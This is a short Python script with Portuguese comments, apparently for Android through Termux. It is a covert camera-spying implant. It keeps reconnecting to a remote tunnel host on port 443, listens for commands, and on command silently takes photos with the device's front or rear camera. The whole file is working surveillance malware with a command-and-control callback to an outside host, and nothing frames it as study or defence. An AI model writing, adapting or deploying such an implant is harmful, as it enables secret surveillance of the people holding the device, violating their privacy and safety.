import os, time, socket
from jnius import autoclass

def tirar_foto(camera_id):
    # Simulação de comando de câmera via Android
    # camera_id 0 = Traseira, 1 = Frontal
    try:
        os.system(f"termux-camera-photo -c {camera_id} foto_{camera_id}.jpg")
        return True
    except:
        return False

def iniciar():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("jkfh48jrpdys.share.zrok.io", 443))
            while True:
                comando = s.recv(1024).decode()
                if "FOTO_FRONTAL" in comando:
                    tirar_foto(1)
                elif "FOTO_TRASEIRA" in comando:
                    tirar_foto(0)
                if not comando: break
            s.close()
        except:
            time.sleep(5)

iniciar()
                                 
